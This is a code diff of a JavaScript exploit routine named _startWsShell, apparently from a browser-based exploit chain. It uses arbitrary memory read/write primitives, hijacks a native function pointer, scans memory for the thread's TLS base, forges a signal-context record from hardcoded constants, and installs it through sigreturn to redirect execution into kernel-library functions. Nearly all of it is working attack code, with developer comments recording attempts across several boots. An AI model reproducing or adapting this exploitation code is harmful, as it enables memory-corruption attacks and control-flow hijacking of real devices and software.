@@ -5439,8 +5439,38 @@ function _startWsShell(){
           SF('1 lk=0x'+lkS.toString(16)+' canary=0x'+canS.toString(16));
           if(!(canS>0x1000000n)){reply.err='canary fail';break;}
           reply.lk='0x'+lkS.toString(16);
-          reply.targets={recovery:'banked retSlot cfr-0x328',getcontext:'lk+0x142C0',
+          reply.targets={recovery:'banked retSlot cfr-0x328',fsbase:'pthread self-pointer',
                          sigreturn:'lk+0x13ED0',thr_create:'lk+0x13D20',thr_exit:'lk+0x13EC0'};
+
+          /* (1b) THE FS-BASE DISCOVERY v2 (srop19). The corpus's kernel-side
+           * 417 disassembly: the install sets FS/GS base from the record's
+           * +0x480/+0x488 - all four install deaths were stale/garbage TLS
+           * bases (srop15 even restored the LOADER boot's TCB 0x881090080).
+           * MEASURED THIS SESSION (id=100): the TCB is the pthread's
+           * EXTERNAL pointer (the pthread struct's +0x1F0 slot on this
+           * boot): [TCB+0x10] = the pthread back-reference, [TCB+8] =
+           * TCB+0x40 (the self-reference), and the TCB allocations end in
+           * 0x080 across boots/processes (0x881068080, 0x881090080 from the
+           * corpus's GET_FSBASE runs, 0x8ff81c080 here). Discovery: scan
+           * ptS..+0x400 for 0x88-region pointers, read +0x18 at each,
+           * accept [C+0x10]===ptS || [C]===C || [C+8]===C. */
+          var fsB=0n;
+          var pdS=S.absRead(ptS,0x400);
+          for(var fS=0;fS<pdS.length;fS++){
+            var vF=pdS[fS];
+            if(vF>=0x880000000n&&vF<0x900000000n&&!(vF>=ptS&&vF<ptS+0x400n)){
+              var tS3=S.absRead(vF,0x18);
+              if(tS3[2]===ptS||tS3[0]===vF||tS3[1]===vF){fsB=vF;break;}
+            }
+          }
+          reply.ptS='0x'+ptS.toString(16);
+          reply.fsbase='0x'+fsB.toString(16);
+          if(fsB===0n){
+            reply.pthreadHead=pdS.slice(0,0x40).map(function(v){return '0x'+v.toString(16);});
+            reply.err='no TCB (fsbase) found via the pthread mutual reference';break;
+          }
+          SF('1b fsbase=0x'+fsB.toString(16)+' (the pthread TCB, mutual-ref validated)');
+          if(!(fsB>0x800000000n)){reply.err='fsbase implausible';break;}
 
           /* (1) THE BANKED V70 RETURN-SLOT DELTA: four independent boots
            * placed retSlot at cfr-0x328 exactly (0x...9ef8/0x...1ef8/
@@ -5452,27 +5482,34 @@ function _startWsShell(){
           reply.retSlot={addr:'0x'+retSlotAddr.toString(16),provenance:'V70 constant cfr-0x328 across four boots'};
           SF('2 direct retSlot=0x'+retSlotAddr.toString(16)+' (cfr-0x328)');
 
-          /* (2) THE IN-SESSION KERNEL CAPTURE (srop16). The hand-built class
-           * is CLOSED: srop12-15 wrote every record byte (the complete 814a
-           * replication included) and all four installs died identically -
-           * the kill is the boot-specific pointer chain (+0x280..0x2D8), which
-           * cannot be replicated without a live capture. The capture call is
-           * getcontext(lk+0x142C0) with RDI=B: the kernel writes the TRUE
-           * current record (fsbase/gsbase/SCS/FP all real for THIS thread).
-           * B = fakeScope+0x2000 pre-cloned with the live scope head, so the
-           * post-call trampoline read of [B+0x38] (the VM pair) stays valid
-           * UNLESS the kernel also writes the record preamble - which is
-           * exactly what mode=gc measures. B+0x48==B (the captured RDI self-
-           * pointer) + magic 0x480 = the capture proven. mode=gc stops after
-           * the capture; rt and the real fire patch the captured record and
-           * install it with sigreturn(RDI=B). */
-          var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n,B=CAP+0x2000n;
+          /* (2) THE PARENT RECORD (srop18 = the srop15 full accounting + THE
+           * FS BASE FIX). The kernel copies ONLY: the GPRs (+0x48, 0x90),
+           * the tail (+0xD8, 0x30), FS/GS base (+0x480/+0x488), and the mask
+           * (+0x08). The 814a constants ride along harmlessly; the
+           * +0x280..0x2D8 chain is never read; the live VM pair (+0x38/0x40)
+           * is skipped so a 417 REJECTION still returns through the
+           * trampoline alive (the fire19 proof). THE FIX: +0x480 = the
+           * discovered live FS base, +0x488 = 0 (the captured GS). */
+          var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n;
           for(var zS=0;zS<0x500/8;zS++)S.absWrite(CTX+BigInt(zS*8),0n);
           S.absWrite(WIT,0n);
           S.absWrite(STK,lkS+0x13EC0n);
-          var headS=S.absRead(CAP,0x48);
-          for(var hW=0;hW<headS.length;hW++)S.absWrite(B+BigInt(hW*8),headS[hW]);
           reply.vm38='0x'+S.absRead(S.fakeScope+0x38n,8)[0].toString(16);
+          var K814={128:0x2FECE976n,136:cfrS,144:0x515CA11n,152:0x4B1AA0n,
+                   160:0xFFFFFFFFn,176:0x2FD98042n,184:0x2FD98042n,
+                   192:0x1B001300000000n,208:0x3B003B00000001n,
+                   232:0x43n,240:0x202n,256:0x3Bn,
+                   264:0x480n,272:0x10002n,280:0x20001n,
+                   320:0x20037Fn,344:0x2FFFF00009FE5n,
+                   352:0xFFFFn,376:0xFFFFn,400:0xFFFFn,408:0xFFFFn,424:0xFFFFn,
+                   464:0x8180000000000000n,472:0x4007n,
+                   560:0x3FF0000000000000n,624:0xFFFFFFFFFFFFFFFFn,632:0xFFFFFFFFFFFFFFFFn,
+                   832:0x7n,1152:fsB,1160:0n};
+          for(var rW=0;rW<0x4C0;rW+=8){
+            if(rW===0x38||rW===0x40)continue;
+            S.absWrite(CAP+BigInt(rW),(K814[rW]!==undefined)?K814[rW]:0n);
+          }
+          reply.recordReplicated=true;
           /* the child starts at the identified Thrd_exit import. Only the
            * proven manual gates are used; parent TLS/stack state is not copied. */
           S.absWrite(CTX+0x048n,0n);
@@ -5496,55 +5533,25 @@ function _startWsShell(){
             if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
             return orig;
           }
-
-          /* (3) THE CAPTURE CALL: scopeSlot<-B so RDI=B; getcontext writes the
-           * true record into B and (if the preamble is not kernel-written)
-           * the VM pair survives the post-call trampoline read. */
-          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,B);
-          var oGC=S.absRead(S.neEntry.addr+0x28n,8)[0];
-          S.absWrite(S.neEntry.addr+0x28n,lkS+0x142C0n);
-          SF('GC-CALL target=lk+0x142C0 buf=0x'+B.toString(16));
-          try{Math.round(-5.7);}catch(eG){}
-          S.absWrite(S.neEntry.addr+0x28n,oGC);
-          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
-
-          /* (4) THE CAPTURE GATES: no install without a proven record. */
-          var vmA=S.absRead(B+0x38n,8)[0],selfB=S.absRead(B+0x48n,8)[0];
-          var csB=S.absRead(B+0xE8n,8)[0],ssB=S.absRead(B+0x100n,8)[0];
-          var mgB=S.absRead(B+0x108n,8)[0],tyB=S.absRead(B+0x110n,8)[0];
-          var sbB=S.absRead(B+0x118n,8)[0],d0B=S.absRead(B+0xD0n,8)[0];
-          var ripB=S.absRead(B+0xE0n,8)[0],rspB=S.absRead(B+0xF8n,8)[0];
-          var flgB=S.absRead(B+0xF0n,8)[0];
-          reply.capture={buf:'0x'+B.toString(16),vmAfter:'0x'+vmA.toString(16),
-                         self:'0x'+selfB.toString(16),cs:'0x'+csB.toString(16),
-                         ss:'0x'+ssB.toString(16),rflags:'0x'+flgB.toString(16),
-                         magic:'0x'+mgB.toString(16),type:'0x'+tyB.toString(16),
-                         subtype:'0x'+sbB.toString(16),d0:'0x'+d0B.toString(16),
-                         rip:'0x'+ripB.toString(16),rsp:'0x'+rspB.toString(16)};
-          var capOK=(selfB===B&&mgB===0x480n&&tyB===0x10002n&&sbB===0x20001n&&csB===0x43n&&ssB===0x3Bn);
-          reply.capture.valid=capOK;
-          if(!capOK){reply.err='capture gates failed - NOT installing';SF('GC-FAIL gates');break;}
-          SF('GC-OK self==buf magic=0x480 vmAfter==vm38='+(vmA===S.absRead(S.fakeScope+0x38n,8)[0]));
           var isRT=(msg.mode==='rt');
-          if(msg.mode==='gc'){SF('5 GC-ONLY capture banked');break;}
 
-          /* (5) PATCH ONLY the identified fields of the TRUE captured record. */
+          /* (3) THE MODE PATCHES on the record at CAP. */
           if(isRT){
-            S.absWrite(B+0x048n,CAP);       /* tv buffer = the scope head (E2-proven) */
-            S.absWrite(B+0x050n,0n);        /* tz = NULL */
-            S.absWrite(B+0x0E0n,lkS+0xB50n);
+            S.absWrite(CAP+0x048n,CAP);     /* tv buffer = the scope head (E2-proven) */
+            S.absWrite(CAP+0x050n,0n);      /* tz = NULL */
+            S.absWrite(CAP+0x0E0n,lkS+0xB50n);
             SF('3 ROUNDTRIP target=gettimeofday (no thr_create)');
           }else{
-            S.absWrite(B+0x048n,CTX);
-            S.absWrite(B+0x050n,WIT);
-            S.absWrite(B+0x0E0n,lkS+0x13D20n);
-            SF('3 child RIP=thr_exit parent=(RDI=ctx,RSI=wit,RDX=0) captured RSP kept');
+            S.absWrite(CAP+0x048n,CTX);
+            S.absWrite(CAP+0x050n,WIT);
+            S.absWrite(CAP+0x0E0n,lkS+0x13D20n);
+            SF('3 child RIP=thr_exit parent=(RDI=ctx,RSI=wit,RDX=0) fsbase installed');
           }
-          S.absWrite(B+0x058n,0n);
-          S.absWrite(B+0x0F8n,retSlotAddr);
+          S.absWrite(CAP+0x058n,0n);
+          S.absWrite(CAP+0x0F8n,retSlotAddr);
 
-          /* (6) THE INSTALL: sigreturn reads the captured record at RDI=B. */
-          var origSr=SF_CALL(lkS+0x13ED0n,B);
+          /* (4) THE INSTALL: sigreturn reads the record at RDI=CAP. */
+          var origSr=SF_CALL(lkS+0x13ED0n,CAP);
           reply.sigreturnRestored=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origSr);
           if(isRT){
             var tvSec=S.absRead(CAP,8)[0],tvUsec=S.absRead(CAP+8n,8)[0];
